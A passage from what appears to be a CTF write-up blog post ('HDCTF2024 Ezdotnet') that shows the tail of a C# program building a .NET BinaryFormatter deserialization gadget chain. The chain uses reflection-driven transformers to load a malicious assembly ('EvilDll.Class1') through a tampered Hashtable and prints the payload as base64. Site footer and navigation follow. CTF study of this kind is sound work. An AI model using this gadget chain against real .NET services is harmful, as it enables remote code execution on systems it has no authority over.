+</span></span><span class="line"><span class="cl">        <span class="n">invoker2</span><span class="p">.</span><span class="n">methodParam</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[]</span> <span class="p">{</span> <span class="s">&#34;EvilDll.Class1&#34;</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">invoker2</span><span class="p">.</span><span class="n">typeName</span> <span class="p">=</span> <span class="s">&#34;System.Reflection.Assembly&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chainedTransformer</span><span class="p">.</span><span class="n">_transformers</span> <span class="p">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">[]{</span><span class="n">invoker1</span><span class="p">,</span> <span class="n">invoker2</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">badBean</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BadBean</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">filed</span> <span class="p">=</span> <span class="n">badBean</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_transformer&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filed</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">badBean</span><span class="p">,</span> <span class="n">chainedTransformer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kt">var</span> <span class="n">ht</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">badBean</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FieldInfo</span> <span class="n">fi_keys</span> <span class="p">=</span> <span class="n">ht</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_buckets&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Array</span> <span class="n">keys</span> <span class="p">=</span> <span class="p">(</span><span class="n">Array</span><span class="p">)</span><span class="n">fi_keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FieldInfo</span> <span class="n">fi_key</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetElementType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">keys</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">object</span> <span class="n">bucket</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">object</span> <span class="n">key</span> <span class="p">=</span> <span class="n">fi_key</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="k">is</span> <span class="kt">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">fi_key</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">badBean</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">fi_keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="n">keys</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">BinaryFormatter</span> <span class="n">formatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="p">[]</span> <span class="n">binaryData</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">ms</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">formatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">ms</span><span class="p">,</span> <span class="n">ht</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">binaryData</span> <span class="p">=</span> <span class="n">ms</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">//ms.Position = 0;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//formatter.Deserialize(ms);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="n">base64String</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">binaryData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">base64String</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/image-20260825233241283.png' alt="image-20260825233241283"></p>
+<h1 class="heading-element" id="other"><span>Other</span>
+  <a href="#other" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>&hellip;</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2026-08-25 23:30:16">Updated on 2026-08-25&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://blog.p0l1st.top/post/dotnet-challenge/" data-title="Dotnet Challenge" data-hashtags=".NET Challenge"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.p0l1st.top/post/dotnet-challenge/" data-hashtag=".NET Challenge"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.p0l1st.top/post/dotnet-challenge/" data-title="Dotnet Challenge"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/.net-challenge/" class="post-tag" title="Tags - .NET Challenge">.NET Challenge</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/post/asp.net-viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-nav-item" rel="prev" title="ASP.NET ViewState反序列化"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>ASP.NET ViewState反序列化</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#hdctf2024-ezdotnet">HDCTF2024 Ezdotnet</a></li>
+    <li><a href="#other">Other</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.161.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.5"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">p0l1st</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/106e985dcbdafa83ae79aaca5476042f.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
